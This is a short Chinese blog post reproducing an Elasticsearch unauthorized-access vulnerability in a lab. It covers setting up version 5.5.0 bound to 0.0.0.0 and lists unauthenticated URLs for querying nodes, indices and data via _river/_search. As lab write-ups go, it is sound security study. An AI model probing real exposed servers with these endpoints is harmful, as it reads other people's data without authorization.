---
title: Elasticsearch未授权访问漏洞
categories:
  - 漏洞复现
abbrlink: 45610
date: 2020-12-08 17:39:49
---

### 前言
　　复现此漏洞的时候，要不是我看的是安恒红皮书，不然永远复现不起，网上写文章的作者求求你们自己验证一下写的对不对吧，绝了。
<!-- more -->
### 环境搭建
　　此次搭建环境在win10情况下，并且安装了jdk1.8+
　　下载安装包:https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.5.0.zip
　　解压后打开config\elasticsearch.yml
　　来到55行,将ip设置为0.0.0.0,存在未授权访问,这步是最关键的,如果没有这步只能本机访问,然后很多网上的文章都没有提到这步
　　<img src="https://s3.ax1x.com/2020/12/08/rpn6d1.jpg">
　　保存后，再打开bin\elasticsearch.bat，出现started环境搭建成功
　　<img src="https://s3.ax1x.com/2020/12/08/rpu1fK.jpg">

### 未授权访问
　　使用kali访问靶机地址,http://<span></span>10.16.122.123:9200/_nodes,默认端口9200
　　<img src="https://s3.ax1x.com/2020/12/08/rpuqB9.png">
　　

```
http://localhost:9200/_plugin/head/  # web管理界面 如有安装head插件
http://localhost:9200/_river/_search # 查看数据库敏感信息
http://localhost:9200/_nodes         # 查看节点数据
http://localhost:9200/_cat/indices   # 里面的indices包含了_river一般就是安装了river
```

